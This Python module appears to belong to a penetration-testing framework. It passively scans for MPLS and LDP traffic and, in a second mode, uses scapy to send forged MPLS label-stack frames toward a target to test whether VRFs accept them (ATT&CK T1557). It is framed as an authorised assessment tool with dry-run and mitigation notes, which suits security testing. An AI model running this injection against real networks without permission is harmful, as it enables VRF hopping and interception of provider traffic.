"""
MPLS Assessment (LDP Discover + Label Inject) — T1557

Two modes for MPLS PE-CE / core edge assessment:

  scan   — passive sniff for MPLS ethertypes 0x8847/0x8848 + LDP hellos
           (UDP/646 to 224.0.0.2) to confirm MPLS is present before any
           injection. Safe, recommended first step for customer demo.
  inject — impose a forged label stack Ether/MPLS(label)/IP and send
           toward a target. Tests VRF/label acceptance from CE position.
           Requires MPLS enabled on the receiving PE; otherwise frames
           are dropped (expected — proves filtering works).

VPNv4 note: full MP-BGP VPNv4 (RD/RT) injection reuses the existing
`bgp` module session — establish PE-CE BGP first, then inject label.

Mitigation: LDP authentication + label filtering on CE-facing ports,
MPLS only on trusted core links, MD5 on PE-CE BGP.
"""
import time

from scapy.all import Ether, IP, ICMP, UDP, Raw, sendp, sniff, hexdump
try:
    from scapy.contrib.mpls import MPLS
except ImportError:
    from scapy.layers.mpls import MPLS  # fallback for newer scapy layouts

NAME = "mpls"
DESCRIPTION = "MPLS LDP discover + label-stack inject (VRF hop test)"
ATTCK_ID = "T1557"

LDP_MCAST = "224.0.0.2"


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help=f"{DESCRIPTION} ({ATTCK_ID})",
                              description=__doc__)
    p.add_argument("-i", "--interface", required=True)
    p.add_argument("--mode", choices=["scan", "inject"], default="scan")
    p.add_argument("--label", type=int, default=100, help="MPLS label to impose (16-1048575)")
    p.add_argument("--target-ip", default="10.0.0.1", help="Inner IP destination")
    p.add_argument("--timeout", type=int, default=20, help="Scan window seconds")
    p.add_argument("-c", "--count", type=int, default=50)
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("--verbose", "-v", action="store_true")
    add_engagement_args(p)
    p.set_defaults(func=run)


def _scan(args, logger):
    logger.info("[MPLS] scan %ds on %s — listening for 0x8847/0x8848 + LDP/646 ...",
                args.timeout, args.interface)
    found = {"mpls": 0, "ldp": 0}

    def handler(pkt):
        try:
            if pkt.haslayer(MPLS):
                found["mpls"] += 1
                logger.info("[MPLS] labeled frame: label=%s ttl=%s from %s",
                            pkt[MPLS].label, pkt[MPLS].ttl,
                            pkt[Ether].src if pkt.haslayer(Ether) else "?")
            if pkt.haslayer(UDP) and (pkt[UDP].sport == 646 or pkt[UDP].dport == 646):
                found["ldp"] += 1
                logger.info("[MPLS] LDP hello from %s", pkt[IP].src if pkt.haslayer(IP) else "?")
        except Exception:
            pass

    sniff(iface=args.interface, prn=handler, store=False, timeout=args.timeout,
          filter="udp port 646 or (ether proto 0x8847 or ether proto 0x8848)")
    logger.info("[MPLS] scan done: labeled=%d ldp=%d", found["mpls"], found["ldp"])
    if found["mpls"] == 0 and found["ldp"] == 0:
        logger.warning("[MPLS] No MPLS seen — do NOT run inject; PE likely has MPLS off or you are not on MPLS path.")
    else:
        logger.info("[MPLS] MPLS present — inject may be viable in lab. Validate IOS first.")
    return True


def _inject(args, logger):
    if not 16 <= args.label <= 1048575:
        logger.error("Label must be 16-1048575 (0-15 reserved)")
        return False
    pkt = (Ether() / MPLS(label=args.label, cos=0, s=1, ttl=64) /
           IP(dst=args.target_ip) / ICMP() / Raw(load=f"MPLS label={args.label}".encode()))
    if args.dry_run:
        logger.info("--dry-run: label-stack preview")
        pkt.show()
        hexdump(bytes(pkt)[:64])
        return True
    try:
        for i in range(args.count):
            sendp(pkt, iface=args.interface, verbose=args.verbose)
            if (i + 1) % 10 == 0:
                logger.info("[MPLS] %d/%d label=%d -> %s", i + 1, args.count, args.label, args.target_ip)
            time.sleep(0.05)
        logger.info("[MPLS] Done — if PE accepted, check VRF counters; if dropped, filtering works.")
        return True
    except Exception as e:
        logger.error("[MPLS] Error: %s", e)
        return False


def run(args, logger):
    from core.common import require_root
    require_root()
    logger.info("START | technique=%s | iface=%s | mode=%s", ATTCK_ID, args.interface, args.mode)
    ok = _scan(args, logger) if args.mode == "scan" else _inject(args, logger)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1
